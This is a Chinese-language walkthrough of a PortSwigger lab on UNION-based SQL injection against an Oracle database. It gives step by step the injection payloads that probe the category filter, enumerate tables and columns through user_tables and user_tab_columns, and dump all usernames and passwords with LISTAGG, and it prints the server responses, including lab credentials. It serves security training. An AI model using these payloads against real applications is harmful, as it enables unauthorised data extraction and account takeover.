# 实验：SQL 注入攻击，在 Oracle 数据库上列出数据库内容

本实验在产品类别过滤器中包含一个 SQL 注入漏洞。查询结果会返回在应用程序的响应中，因此你可以使用 UNION 攻击从其他表中检索数据。

该应用程序具有登录功能，且数据库包含一个存储用户名和密码的表。你需要确定该表的名称及其包含的列，然后检索表的内容以获取所有用户的用户名和密码。

为了解决本实验，请以 `administrator` 用户身份登录。

> **提示**
> 在 Oracle 数据库中，每个 `SELECT` 语句必须指定一个要从中选择的表（`FROM`）。如果你的 `UNION SELECT` 攻击不从表中查询，你仍然需要包含 `FROM` 关键字后跟一个有效的表名。
>
> Oracle 中有一个名为 `dual` 的内置表，你可以用于此目的。例如：`UNION SELECT 'abc' FROM dual`
>
> 欲了解更多信息，请参阅我们的 [SQL 注入速查表](https://portswigger.net/web-security/sql-injection/cheat-sheet)。

## 步骤

探测
- 使用类别过滤功能
    ```http
    GET /filter?category=Accessories' HTTP/2
    ```

- 进行1/2个单引号的字符串型 SQLi 测试
    - 1报错，2正常。显示典型 SQLi 字符串注入点

- 列数探测
    - 2列

- 列字符串类型探测
    ```sql
    $input = 'Accessories' AND 1=0 UNION SELECT 'a',NULL FROM DUAL--
    ```
    - 第一列为字符串型


测试
- 读取当前用户的表名
    ```sql
    $input = 'Accessories' AND 1=0 UNION SELECT table_name ,NULL FROM user_tables   --
    ```

    - 服务器响应
        ```log
        PRODUCTS
        USERS_BJGAXB
        ```

- 读取目标 users 表的列项目
    ```sql
    $input = 'Accessories' AND 1=0 UNION SELECT column_name ,NULL FROM user_tab_columns WHERE table_name='USERS_BJGAXB'   --
    ```

    - 服务器响应

        ```log
        EMAIL
        PASSWORD_VDEEWQ
        USERNAME_LCSMLW
        ```

- 读取目标 users 表的用户名与密码
    ```sql
    $input = 'Accessories' AND 1=0 UNION SELECT LISTAGG(USERNAME_LCSMLW || ' : ' || PASSWORD_VDEEWQ, ' , ') WITHIN GROUP (ORDER BY 0), NULL FROM USERS_BJGAXB --
    ```

    - 服务器响应
        ```log
        administrator : 5db90v8e9h3jgo27mnxd , carlos : k7rdugz5iprypki0mjxh , wiener : olj438aud5czoxo701bl
        ```
